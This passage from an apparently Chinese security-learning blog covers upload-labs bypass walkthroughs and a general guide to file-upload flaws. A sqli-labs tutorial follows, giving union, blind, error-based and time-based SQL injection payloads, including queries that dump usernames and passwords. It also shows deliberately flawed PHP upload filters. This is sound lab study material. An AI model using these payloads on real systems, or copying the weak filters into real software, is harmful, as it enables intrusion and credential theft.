class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用Windows的特性如果文件名+ ::$DATA 会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持 ::$DATA 之前的文件名 他的目的就是不检查后缀名,上传.php::$DATA绕过。</p><h3 id="Pass-09-点-空格-点-绕过"><a href="#Pass-09-点-空格-点-绕过" class="headerlink" title="Pass-09 点 + 空格 + 点 绕过"></a>Pass-09 点 + 空格 + 点 绕过</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还是会删除文件结尾的点。和第七题一样的方法就可以绕过。</p><h3 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10 双写绕过"></a>Pass-10 双写绕过</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$deny_ext</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要是这个函数str_ireplace<code>$file_name = str_ireplace($deny_ext,"", $file_name);</code></p><p>会把后缀替换为空</p><p>双写绕过<code>.pphphp</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="2020/11/29/wen-jian-shang-chuan-lou-dong/"/>
      <url>2020/11/29/wen-jian-shang-chuan-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传漏洞原理"><a href="#文件上传漏洞原理" class="headerlink" title="文件上传漏洞原理"></a>文件上传漏洞原理</h1><p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。</p><h2 id="常见文件上传检测"><a href="#常见文件上传检测" class="headerlink" title="常见文件上传检测"></a>常见文件上传检测</h2><h3 id="1-客户端js检查"><a href="#1-客户端js检查" class="headerlink" title="1.客户端js检查"></a>1.客户端js检查</h3><p>js代码中加了拓展名的黑名单限制，防止一般用户上传不被允许的文件。</p><p>绕过方式：</p><p>1.burpsuite抓包修改</p><p>2.前端修改js代码</p><p>3.禁用浏览器js</p><h3 id="2-服务端检测绕过"><a href="#2-服务端检测绕过" class="headerlink" title="2.服务端检测绕过"></a>2.服务端检测绕过</h3><h4 id="MIME-类型检测"><a href="#MIME-类型检测" class="headerlink" title="MIME 类型检测"></a>MIME 类型检测</h4><p>主要是检测Content-Type: 字段</p><p>就是检查Content-Type的值，MIME类型决定了某种扩展名用什么应用程序打开，GIF的MIME值为image/gif</p><p>绕过方式：</p><p>burp抓包修改Content-Type: 为允许的字段<br>Content-Type: image/gif<br>Content-Type: image/png<br>Content-Type: image/jpeg</p><h4 id="文件拓展名检查"><a href="#文件拓展名检查" class="headerlink" title="文件拓展名检查"></a>文件拓展名检查</h4><p>与前端js后缀名检测类似，只不过是在后端进行检查，有时候还可以配合解析漏洞结合目录路径攻击，例如test.asp/test.jpg。后端后缀名检查也分两种，黑名单与白名单。</p><p>黑名单检查绕过：</p><ul><li>文件名大小写绕过，例代码中有php规则，那么可以使用PHP或pHP绕过。</li><li>黑名单列表绕过，对黑名单列表中没有的扩展名进行攻击，比如asa、cer等。</li><li>利用windows和Linux系统的特性进行特殊文件名绕过，a.asp. a.asp_等。</li><li>htaccess 文件攻击。</li><li>配合解析漏洞(IIS、Apache等)。</li></ul><p>白名单绕过：</p><ul><li>截断攻击，比如a.asp%00.gif等。</li><li>配合解析漏洞。</li></ul><h4 id="目录路径的检查"><a href="#目录路径的检查" class="headerlink" title="目录路径的检查"></a>目录路径的检查</h4><p>对目录路径可进行0x00截断绕过；以及可以控制目录地址，上传文件夹的参数可控)</p><h4 id="检测文件内容是否包含恶意代码"><a href="#检测文件内容是否包含恶意代码" class="headerlink" title="检测文件内容是否包含恶意代码"></a>检测文件内容是否包含恶意代码</h4><p>这种方式主要检查图片文件的幻数，比如GIF的值为GIF89a，后端代码会检测改值判断是否为GIF图片文件，想要绕过只要在幻数后面加上一句话木马就行。</p><h4 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h4><p><strong>iis解析漏洞</strong><br>1 目录解析<br>以*.asp命名的文件夹里的文件都将会被当成ASP文件执行。<br>2 文件解析<br>*.asp;.jpg 像这种畸形文件名在“；”后面的直接被忽略，也就是说当成 <em>.asp文件执行。<br>IIS6.0 默认的可执行文件除了asp还包含这三种 *.asa *.cer *.cdx<br>3 默认解析<br>.asp .aspx .ashx .asa .cer这是系统默默认的后缀名<br>*</em>Apache解析漏洞**<br>Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断。比如xxx.php.rar对apache来说rar是不可解析的，所以就会解析成xxx.php</p><p><strong>nginx解析漏洞</strong><br>开启cgi:SCRIPT_NAME FASTCGI:<br><a href="http://www.xx.com/a.jpg/.php(%E4%BB%BB%E4%BD%95%E4%B8%8D%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6)-----%E5%8F%AF%E4%BB%A5%E8%A7%A3%E6%9E%90%E4%B8%BA.php%E6%96%87%E4%BB%B6">www.xx.com/a.jpg/.php(任何不存在文件)-----可以解析为.php文件</a><br>a.jpg:<!--?php phpinfo();?--><br>a.php%00.jpg—-解析为a.php</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入原理及sqlmap的使用</title>
      <link href="2020/11/28/sql-zhu-ru-yuan-li-ji-qi-sqlmap-de-shi-yong/"/>
      <url>2020/11/28/sql-zhu-ru-yuan-li-ji-qi-sqlmap-de-shi-yong/</url>
      
        <content type="html"><![CDATA[<p>mysql数据库刚刚学完,学的都是开发用到的建表,增删查改,存储过程之类的知识</p><p>现在来学习学习sql注入.</p><p>sql注入也是基于基础的sql语句来实现对数据库系统的恶意操做的</p><h3 id="基础部分"><a href="#基础部分" class="headerlink" title="基础部分"></a>基础部分</h3><p>首先是<strong>sql注入要满足的条件及原理</strong>:</p><p>1.参数可控:就是可以自定义传入的参数</p><p>2.参数要可以带到数据库查询:传入的参数所拼接成的sql语句,必须带入数据库查询</p><p>在做数据库实验的过程中也发现mysql会有个默认的information_schema数据库,里面有好多好东西啊,在一些表里面可以看到所有的数据库名,表名,还有其他一些数据库的信息。</p><p>还有一些有用的函数,可以查看数据库的基本信息,都用得到</p><pre class="line-numbers language-none"><code class="language-none">@@datadir: 查询数据库的物理路径@@version: 查询数据库版本version(): database(): 查看数据库名user(): 查看mysql用户limit m,n: 从m条记录开始取n条记录......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="构造闭合语句"><a href="#构造闭合语句" class="headerlink" title="构造闭合语句"></a>构造闭合语句</h3><p>sql注入需要将前面的语句闭合起来或者是形成自己的sql语句,可以有一下几种方式:</p><p>‘ (单引号)可以把id括起来，使前面的语句闭合</p><p>构造语句的时候，一是要把我们构造的语句释放出来，二是要把结构进行补全或者适当的注释。</p><p>注释可以用–+;– -;#把后面的’或者多余的修饰符注释掉，当然不同数据库的注释方法也不尽相同。</p><p>/<em>!</em>/ (内联注释可以放在整个sql语句中)</p><p>下面是一些常用的结构</p><pre class="line-numbers language-none"><code class="language-none">or 1=1--+ 'or 1=1--+ "or 1=1--+ )or 1=1--+ ')or 1=1--+ ") or 1=1--+ "))or 1=1--+ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="sql注入的类型"><a href="#sql注入的类型" class="headerlink" title="sql注入的类型"></a>sql注入的类型</h3><h4 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h4><p>感觉思路是比较清晰的，一步一步的扩大对数据库的查询范围，最后获取到有用信息。就是order by查字段有点烦</p><p>一般的union注入感觉都可以安装这个步骤来：</p><p>1.先找到闭合规则</p><p>2.然后用order by子句查询属性列的字段数,也就是看有多少列</p><p>3.接着就可以获取database()了，先把id换成-1，数据库没有id=-1的数据，这样就可以把所有select起来的数据都显示出来</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,database(),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到当前的数据库是security</p><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201128181500483.png" alt="image-20201128181500483"></p><p>4.查表名</p><p>因为当时union select出来的数据显示2，3</p><p>所以可以在原来2，3的位置插入sql语句，但要用（）将要插入的sql语句包起来</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema ='security'),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5.查用户属性也就是字段</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name = 'users'),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以发现有三个属性</p><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201128182556779.png" alt="image-20201128182556779"></p><p>6.查完属性就可以查列了，把username全部调出来</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(username) from security.users),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201128182809754.png" alt="image-20201128182809754"></p><p>7.最后就是查用户密码了</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,(select group_concat(password) from security.users),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Boolean盲注"><a href="#Boolean盲注" class="headerlink" title="Boolean盲注"></a>Boolean盲注</h4><p>感觉这个全靠猜，但是猜也得讲究技巧呀，比如可以用数据结构学过的二分法去搞</p><p>1.先判断是不是Boolean盲注，如果能报错，但没有报错信息，正确查询也显示不了查询内容就属于布尔盲注，Boolean顾名思义只存在两种状态，对或错，你看不到任何信息，只有true or false</p><p>比如这题，猜对了只有You are in 显示，猜错了就啥也没有</p><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201128185412649.png" alt="image-20201128185412649"></p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-5?id=1 and 1=1 --+ 正常http://127.0.0.1/sqli-labs/Less-5?id=1 and 1=2 --+ 正常http://127.0.0.1/sqli-labs/Less-5?id=1' and 1=2 --+ 不正常http://127.0.0.1/sqli-labs/Less-5?id=1' and 1=1 --+ 正常综上可以判断是字符串盲注了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.根据返回状态判断闭合规则</p><p>3.<strong>经常用到的就是length()和substr()语句，来猜数据库、表名等的长度和正确字母；</strong></p><pre class="line-numbers language-none"><code class="language-none">length()：返回字符串的长度substr(str,pos,num) ：截取指定位置指定长度的字符串mid(str,pos,num) :截取指定位置指定长度的字符串ascii() 查询ascii码中对应的值char() 查询字符对应的ascii值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><ol><li><p>只要注入点有sql报错信息，就可以使用报错注入；</p></li><li><p>还是一样，引号报错，然后找到闭合规则，页面正常显示，则可以在闭合规则中开始写入报错注入的sql语句；</p></li><li><p>updatexml报错获取当前数据库：</p><pre class="line-numbers language-none"><code class="language-none">and updatexml(1,concat(0x7e,(select database()),0x7e),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>floor报错获取当前数据库：</p><pre class="line-numbers language-none"><code class="language-none">and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>两种方式应该都可行，如果第一个不行就换第二个试试</p></li><li><p>接着可以利用select语句替换掉上面database()来继续获取数据库中的表名、字段名，查询语句和union注入攻击的语句相同；</p></li><li><p>注意这里不能再使用group_concat了，因为报错注入只显示一条结果，所以需要使用limit语句；</p></li></ol><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><ol><li><p>没有明确的现象，不管是对是错都返回一个状态；</p></li><li><p>但是如果用sleep(5)方法，能让响应时间延迟为5秒以上，那么就为时间盲注；</p></li><li><p>我们用sleep(5)函数构造了一个时间延时的状态，因此，我们又有了两种状态，像布尔盲注一样可以根据这两种状态来判定数据库、表名和字段名的长度和正确的每个字母；</p></li><li><p>同样的找到正确的闭合规则，这个闭合规则得配合着 and sleep(5)语句来构造，哪一个闭合规则执行了sleep(5)，那么就是正确得闭合规则；</p></li><li><p>时间盲注配合着 if(A,B,C) 语句结合使用，含义是：如果A是 true，则返回B（也就是执行B），否则返回C（执行C）；</p></li><li><p>那么判断当前数据库名的长度的语句为：</p><pre class="line-numbers language-none"><code class="language-none">if (length(database())&gt;1,sleep(5),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就是说如果数据库长度大于1，那么响应延时5秒，否则执行select 